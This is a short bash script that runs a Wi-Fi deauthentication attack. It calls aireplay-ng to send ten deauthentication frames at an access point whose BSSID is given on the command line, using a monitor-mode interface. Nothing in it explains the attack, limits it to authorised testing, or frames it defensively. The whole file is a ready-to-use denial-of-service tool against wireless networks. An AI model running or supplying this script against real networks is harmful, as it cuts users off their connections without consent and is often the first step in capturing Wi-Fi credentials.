#!/bin/bash
echo "Usage: ./deauth.sh <BSSID>"
aireplay-ng -0 10 -a $1 wlan0mon
